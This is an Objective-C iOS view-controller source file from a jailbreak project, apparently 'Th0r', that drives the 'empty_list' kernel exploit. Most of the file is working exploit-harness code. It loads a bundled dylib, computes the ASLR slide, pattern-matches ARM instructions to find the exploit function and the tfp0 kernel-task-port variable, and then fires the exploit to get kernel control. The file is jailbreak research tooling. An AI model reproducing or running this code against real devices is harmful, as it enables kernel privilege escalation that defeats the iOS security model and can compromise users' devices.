//
//  ViewController.m
//  Th0r_empty_list
//
//  Created by Jake James on 12/5/18.
//  Copyright © 2018 Jake James. All rights reserved.
//

#import "ViewController.h"
#import <dlfcn.h>
#import "MachoOffsetFinder.h"

int tries, success;

void addOneTry() {
    NSString *file = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/tries.txt"];
    [[NSString stringWithFormat:@"%d", tries+1] writeToFile:file atomically:YES encoding:NSASCIIStringEncoding error:nil];
}

void addOneSuccess() {
    NSString *file = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/success.txt"];
    [[NSString stringWithFormat:@"%d", success+1] writeToFile:file atomically:YES encoding:NSASCIIStringEncoding error:nil];
}

int getTries() {
    NSString *file = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/tries.txt"];
    NSString *str = [NSString stringWithContentsOfFile:file encoding:NSASCIIStringEncoding error:nil];
    if (!str) return 0;
    return atoi([str UTF8String]);
}

int getSuccess() {
    NSString *file = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/success.txt"];
    NSString *str = [NSString stringWithContentsOfFile:file encoding:NSASCIIStringEncoding error:nil];
    if (!str) return 0;
    return atoi([str UTF8String]);
}

@interface ViewController ()
@property (weak, nonatomic) IBOutlet UIButton *goButton;
@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    
    tries = getTries();
    success = getSuccess();
    
    [self.goButton setTitle:[NSString stringWithFormat:@"%d/%d", success, tries] forState:UIControlStateNormal];
}


- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

- (IBAction)go:(id)sender {
    char *th0r = strdup([[[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:@"el.dylib"] UTF8String]);
    
    __block int rv = initWithMacho(th0r);
    __block bool done = false;
    if (rv) {
        [sender setTitle:@"Failed to open binary" forState:UIControlStateNormal];
        return;
    }
    
    void *handle = dlopen(th0r, 0);
    if (!handle) {
        [sender setTitle:@"Failed to load binary" forState:UIControlStateNormal];
        printf("%s\n", dlerror());
        return;
    }
    
    printf("Loaded binary: %p\n", handle);

    // sometimes device panics before we write to file so make sure we wrote before triggering exploit
    dispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0);
    dispatch_group_t group = dispatch_group_create();
    
    dispatch_group_async(group, queue, ^{
        addOneTry();
    });
    
    dispatch_group_notify(group, queue, ^{
        done = true;
    });
    
    //------ ASLR ------//
    uint64_t header = find_symbol("__mh_execute_header", false);
    uint64_t slid_header = (uint64_t)dlsym(handle, "_mh_execute_header");
    uint64_t aslr_slide = slid_header - header;
    printf("ASLR Slide: 0x%llx\n", aslr_slide);
    
    //------ find offsets_init -------//
    uint64_t string = find_string("this bug is patched in iOS 11.4 and above", false);
    uint64_t ref = find_reference(string, 1);
    uint64_t offsets_init_addr = start_of_function(ref);
    printf("offsets_init at 0x%llx\n", offsets_init_addr);
    
    //------ find empty_list function ------//
    string = find_string("empty_list by @i41nbeer", false); // find this string
    ref = find_reference(string, 1); // get the instruction referencing there
    uint64_t exploit_addr = start_of_function(ref); // find the beginning of that function
    printf("exploit at 0x%llx\n", exploit_addr);
    
    //------ find tfp0 variable -----//
    uint64_t tfp0_ptr_addr = 0;
    string = find_string("rlim.max: %lld", false); // find this string
    ref = find_reference(string, 1); // get the reference
    ref -= base;
    
    uint64_t str_op = 0, adrp = 0, ret = 0;
    for (uint64_t insn = ref; insn < ((__text_offset & ~3) + (__text_size & ~3)); insn += 4) {
        uint32_t *op = load_bytes(file, insn, 4);
        if ((*op & 0x9F000000) == 0x90000000) { // adrp x8, #X
            adrp = insn;
        }
        else if ((*op & 0xff000000) == 0xB9000000) { // str w0, [x8, #X]
            uint32_t reg = (*op & 0x3e0) >> 5;
            if (reg == 8) {
                str_op = *op;
            }
        }
        else if (*op == 0xD65F03C0 && insn > adrp && adrp != 0) { // ret
            ret = insn;
            free(op);
            break;
        }
        free(op);
    }
    
    tfp0_ptr_addr = calculate_register_value(adrp, ret, 8);
    tfp0_ptr_addr += (str_op & 0x3ffc00) >> 8;
    tfp0_ptr_addr += base;
    printf("tfp0 variable at 0x%llx\n", tfp0_ptr_addr);
    
    //------- setup --------//
    int (*exploit)(void) = (int (*)(void))(exploit_addr + aslr_slide);
    void (*offsets_init)(void) = (void (*)(void))(offsets_init_addr + aslr_slide);
    mach_port_t *tfp0_ptr = (mach_port_t*)(tfp0_ptr_addr + aslr_slide);
    
    fclose(file);
    
    //----- START ------//
    offsets_init();
    
    while (done == false) sleep(1);
    while (getTries() != (tries + 1)) sleep(1);
    
    rv = exploit();
    
    if (rv) {
        [sender setTitle:@"exploit failed" forState:UIControlStateNormal];
    }
    else {
        [sender setTitle:[NSString stringWithFormat:@"tfp0: 0x%x", *tfp0_ptr] forState:UIControlStateNormal];
        addOneSuccess();
    }
}


@end
